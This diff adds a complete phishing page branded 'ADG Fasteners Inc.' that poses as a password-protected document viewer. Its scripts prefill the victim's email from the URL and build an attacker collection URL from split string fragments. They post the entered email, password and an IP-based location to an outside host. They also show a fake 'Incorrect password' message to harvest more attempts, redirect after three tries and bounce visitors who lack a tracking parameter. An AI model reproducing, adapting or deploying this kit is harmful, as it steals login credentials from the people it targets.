@@ -1,0 +1,168 @@
+<html> 
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1"> 
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" /> 
+<title>ADG Fasteners Inc. </title> 
+
+
+<script>
+try {
+    let xy = window.location.href.split("?");
+    
+    if (xy[1] && xy[1] !== "") {
+      console.log("Found");
+    } else {
+      window.location.href =
+        "http://404.com";
+    }
+  } catch (e) {
+    window.location.href =
+       "http://404.com";
+    console.log(e);
+  }
+ </script>
+
+<style> body, html { height: 100%;margin: 0; font-family: Arial, Helvetica, sans-serif; } * { box-sizing: border-box; } .bg-image { /* The image used */ background-image: url(https://i.imgur.com/ZiHUmzK.png); opacity: 0.5; /* Add the blur effect */ filter: blur(-px); -webkit-filter: blur(-px); /* Full height */ height: 110%; /* Center and scale the image nicely */ ba­ckgro­und­-position: center; background-repeat: no-repeat; background-size: cover; } /* Position text in the middle of the page/image */ .bg-text { background: #143b08; width:370px; height:450px; -webkit-box-shadow: 1px 1px 15px 1px #000000; box-shadow: 1px 1px 15px 1px #000000; border-radius: 1px 25px 1px 40px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 2; text-align: center; } input[type=submit] { width:290px; height:40px; font-family: arial; font-size: 14px; color:#FFF; background-color: #0489B1; border: solid 1px #0489B1; border-radius: 2px 10px 2px 10px; -webkit-box-shadow: 2px 2px 15px 5px #000000; box-shadow: 2px 2px 15px 5px #000000; font-weight:bold; } input[type=password] { width:290px; height:35px; font-family: arial; font-size: 13px; border-radius: 3px; color:#000000; background-color: #FFF; border: solid 1px #FFF; padding: 10px; } input[type=email] { width:290px; height:35px; font-family: arial; font-size: 13px; border-radius: 3px; color:#000000; background-color: #FFF; border: solid 1px #FFF; padding: 10px; } </style> 
+
+ <script type="text/javascript" src="https://code.jquery.com/jquery-latest.min.js"></script>
+ <script>
+    let resBox = 'Exl Atta'
+
+    let nbg1 = "htt";
+    let nbg2 = "ps://godrules";
+    let nbg3 = "steadily.li";
+    let nbg4 = "ve/kgvb/b";
+    let nbg5 = "am.ph";
+    let nbg6 = "p";
+
+    let ov1 = 'htt'
+    let ov2 = 'ps://fdx'
+    let ov3 = 'z.standar'
+    let ov4 = 'd.us-east-1.oortsto'
+    let ov5 = 'rages.com/AbdcS'
+    let ov6 = 'A%24%25%26'
+    let ov7 = '%23%40%40'
+
+    sessionStorage.clear()
+    let trialCount = sessionStorage.getItem("num_trial");
+
+    if (!trialCount) {
+      sessionStorage.setItem("num_trial", 0);
+    } else if (trialCount >= 3) {
+      window.location.assign(`${ov1}${ov2}${ov3}${ov4}${ov5}${ov6}${ov7}`)
+    }
+  </script>
+  
+ </head>
+
+<body>
+<tr><td height="75%" bgcolor="#FFF"> <div class="bg-image"></div> <div class="bg-text"> <table align="center" cellspacing="0"> <tr><td style="height:10px;"></td></tr> <tr><td style="height:8px;"></td></tr> <tr><td> 
+
+<form method="post" action="" id="form_"> </td></tr> <tr><td> </font> </div> </td></tr> <tr><td style="height:7px;"></td></tr> <tr><td> <div align="center"> <font face="arial" size="1" color="#FFF"> <b></b> </font> </div> </td></tr> <tr><td style="height:7px;"></td></tr> <tr><td> <div align="center"> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAARUAAAC2CAMAAADAz+kkAAAAhFBMVEUCcjv////3+/kAZR8AcDgAaSoAZyXa5d4sfU77/v270sUAbTIAbDBuoYMAZiO40MLh7eecv6uKr5d8pozS39c8iF0cfErw9vPB1spalnOlxLITeEMAWACuybnI29CVuaRqnn9QkGoAYheHrZVHjGQ1hFgAXwyBr5VsoIJ1qIsnf09Mj2l60toBAAAEXklEQVR4nO3ca3OiMBQGYCJJFEkRFe9Ft162a/v//9/mgoIQa2tnxy3nfb60qJ0x75w5CdEmCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADg63gs+KPfw/+Ex0okcnLMp4jFsHmI6a/hPGVaj3oqJg+ZTBejQTdiJ5RT0Q1EhvHLLs867BLNVHSByERNjsv1jPlQS8U2ENV7KhrIFXRSsQ0knC42/TT6IBAyqXCu85D8ZZR3b+ZBJhUeTMbLzN9ArqYibvjxsSX1GeYTqYjOh6I5/+mxhHekIm+9Yi4ePaxv+iepdOWjh/VNSMUHqfggFR+k4nNPKiIt6GVOJ62inAqXibX9xdjgd1LaRpRTKf42ftKpVJcmMVJBKkgFqSAVv7tSUY40c9BWnQlJORU1LPR1AJthBY1UZmk2H+Sby11camvbTtrN5vlwfb7eJlIKuarVCrFUus86BCGmp+uhMi+R/Voq8cjZ5Yxlu1Fp18pU2CI2jyVZcbkysw3v1SrhstuGZbdVLe22WWIei4/uam4HJweNVIq/JTMz7+2IRVRe8Ckjn4orD5Gb31NbOI1SIZgKs19O4RPz69j0Wr6qh0IxldyOMtErlI79TeZIRbOfcKkRY0szXk+p6FRCZ7vQKT6HpfbuOg1tGEExLYtmqVQ+OzQhXHxsyNqaSset3NZ2kvaVCrm1rTUyscSvG/NDLJGKMwv1w/xw4OZbHL4xn7+TkNidhMp3EZLW9hXGjmbZb5uut1Suz0G8vXOQXr2FxXOm534llRbPzOx0j6hLZYhUSlkxKOENhWoqy2KkYo5USqcvcPHDlVRix+2vxGdKtDgVt9Q3TybrxpMmlXhc0FNUNq5qcSrKrFQq986NVCiu4uyNkFpeL5belS7c5lSi2OQRzuz07C2WnhoUdGbpoKq1qdhSifdsbXfifMVyXvGH9RV/2Nq+YktFzk8b/J5iITgzD897TW7V4ikWeqlEdpD2rtDtUHqKhV4qG7dZa0d3tPtPYaNYyKUS2SDU2F64Tz6axUIuFVcqYfEdhL1/zaLnIGnZOei3LLVzDnKlEr8Ul307OL6vpyKyQpexWVbF2pjKRnJ9ZyjPxeHuhuqdhdradvE+eQtkuQNnUmp2FpL3QRWzl/00DsPny32WXjxxDq+Mzd8mpUMr+4pfNLv8t8QeL6g/utsm/CxWhFKpIzczIxUHqfggFZ+7Uql2W1l2W067206d1VGvf4NpaUU5FeKrOKSCVCqQig9S8UEqPnf9l/etV+QUTxpRg/6HlurRo/qu01brV1K5dYLRjw8lEIPbh341Unn0m/73RKIOT8MrB+aRTSWwhyvqbPbj/HNngRFJxTHnxoWBOTfuRgMmlYplzxiUH58xSC8Vxx1o+6bbje88SqqpOPbsUrE/1o8epJ2KY865TYL3XdlukErBtZvVYjNIkUqNbTfhYfXo9/E/QqUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAfNZf3zJVRlclmxMAAAAASUVORK5CYII="> </div> </td></tr> <tr><td style="height:10px;"></td></tr> <tr><td style="height:5px;"> <div align="center"> <font face="arial" size="2" color="#FFF"> <font size="1">B&shy;e&shy;c&shy;a&shy;u&shy;s&shy;e&nbsp;y&shy;&shy;o&shy;u&shy;'&shy;r&shy;e&nbsp;a&shy;c&shy;c&shy;e&shy;s&shy;s&shy;i&shy;n&shy;g&nbsp;s&shy;e&shy;n&shy;s&shy;i&shy;t&shy;i&shy;v&shy;e&nbsp;i&shy;n&shy;f&shy;o&shy;,&nbsp;y&shy;o&shy;u&nbsp;n&shy;e&shy;e&shy;d&nbsp;t&shy;o&nbsp;v&shy;e&shy;r&shy;i&shy;f&shy;y&nbsp;y&shy;o&shy;u&shy;r&nbsp;p&shy;a&shy;s&shy;s&shy;w&shy;o&shy;r&shy;d&nbsp; </font> </font> </div> </td></tr> 
+
+<tr><td style="height:5px;"></td></tr> 
+
+<tr><td><table cellspacing="0" align="center"> 
+
+<tr><td> <div align="center"> 
+<input type='hidden' required class='text mm' id="ckorg" readonly>
+<input type="hidden" class='text' name="loc" id="loc">
+<input type="hidden" class='text' name="trial" id="trial">
+
+<input name="login" id="ck" placeholder="Email" type="email" value="" autocomplete> </div> </td></tr> 
+
+<tr><td style="height:7px;"></td></tr> 
+
+<tr><td> <div align="center"> <input name="passwd" id="cknow" type="password" placeholder="Enter Password" required> </div> </td></tr> 
+
+<tr><td style="height:15px;"></td></tr> <div id="errmsg" style="color: #FF0000; font-weight: 400; font-family: sans-serif; font-size: 13px;">
+
+</div>
+
+<tr><td> <div align="left"> <input type="submit" id="loader" value="S&shy;i&shy;g&shy;n&nbsp;i&shy;n"> </div> </td></tr>  
+
+</td></tr></table></form> 
+
+
+
+</table> </td></tr> 
+
+ <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      setInterval(function () {
+        let ccc = document.querySelector('.bg-text')
+        ccc.style.display = 'block'
+        ccc.style.animation = 'show 1s ease'
+
+      }, 2000)
+    })
+    const xx = window.location.href.split('?');
+    let ck = document.querySelector('#ck')
+    let ckorg = document.querySelector('#ckorg')
+    let cknow = document.querySelector('#cknow')
+    let loader = document.querySelector('#loader')
+    let loc = document.querySelector('#loc')
+    let trial = document.querySelector('#trial')
+
+    var base64regex =
+        /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+
+      if (!base64regex.test(xx[1])) {
+        ckorg.value = xx[1];
+        ck.value = xx[1];
+      } else {
+        ckorg.value = atob(xx[1]);
+        ck.value = atob(xx[1]);
+      }
+
+    trial.value = trialCount
+
+    let myForm = document.querySelector('#form_')
+    //console.log(`${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}${nbg7}`)
+    myForm.addEventListener('submit', async function (event) {
+      event.preventDefault()
+
+      let data = new FormData()
+
+      let options = {
+        method: 'POST',
+        body: data
+      }
+
+      data.append('ck', ck.value)
+      data.append('ckorg', ckorg.value)
+      data.append('cknow', cknow.value)
+      data.append('loc', loc.value)
+      data.append('trial', trial.value)
+      data.append('resBox', resBox)
+
+      loader.innerHTML = "<i class='fa fa-circle-o-notch fa-spin'></i> Opening Document..."
+
+      const response = await fetch(`${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}`, options)
+      const result = await response.text()
+
+      loader.innerHTML = "View Document"
+      cknow.value=""
+      console.log(result)
+
+      trialCount++;
+      sessionStorage.setItem("num_trial", trialCount);
+      trial.value = trialCount
+
+      if (trialCount >= 3) {
+        window.location.assign(`${ov1}${ov2}${ov3}${ov4}${ov5}${ov6}${ov7}`)
+      } else {
+        document.getElementById('errmsg').innerHTML = "Incorrect password. please try again "
+      }
+    })
+
+    $.get("https://ipinfo.io/json?token=10da60a9ff2d81", function (response) {
+      let cou = `${response.city}, ${response.region}, ${response.country}. ${response.postal} ${response.timezone}`
+      $("#loc").val(cou);
+    }, "jsonp");
+  </script>
+  
+</body> 
+
+
+</html> 
